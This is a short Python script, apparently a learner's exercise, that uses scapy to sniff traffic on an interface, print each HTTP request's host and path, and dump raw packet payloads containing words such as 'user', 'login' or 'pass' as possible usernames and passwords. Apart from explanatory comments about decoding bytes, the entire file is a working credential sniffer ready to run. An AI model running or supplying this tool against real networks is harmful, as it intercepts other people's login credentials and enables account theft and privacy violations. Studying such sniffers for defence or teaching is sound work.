#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http

def main():
    sniff("eth0")

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username","uname", "user", "login", "pass"]
        for keyword in keywords:
            if keyword in str(load):
                # you may get multiple keywords, so just return the username
                return load.decode('utf-8')

def get_url(packet):
    # convert byte to string by casting to str or use .decode()
    return f"[+]HTTP Request: {(packet[http.HTTPRequest].Host).decode('utf-8')}{(packet[http.HTTPRequest].Path).decode('utf-8')}"


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        # The b prefix in Python strings indicates that the string is a bytes object
        # rather than a regular string (which is typically Unicode).
        # This happens when you're dealing with binary data or byte-encoded strings,
        # often encountered when working with network protocols or reading files in binary mode.
        # To remove the b prefix and work with a regular string,
        # you can decode the bytes object into a string using the .decode() method.
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
        # password is in the raw layer
        # if packet.haslayer(scapy.Raw):
        login_info = get_login_info(packet)
        if login_info:
            print("********************************************")
            # print(packet.show())
            # print out the name of the layer and field we are interested i
            print(f"\n\n[+] - Possible usernames/passwords: {login_info}\n\n")
            print("********************************************")
    # if packet.haslayer(http.HTTPResponse):
    #     http_layer = packet[http.HTTPResponse]
    #     headers = {header: value for header, value in http_layer.fields.items() if header != 'Payload'}
    #     print("HTTP Response Headers:")
    #     for header, value in headers.items():
    #         print(f"{header}: {value}")
    #     print("\n" + "-" * 50 + "\n")
def sniff(interface):
    # added in filtering  based on specific criteria using BPF (Berkeley Packet Filter) syntax
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)








if __name__ == "__main__":
    main()

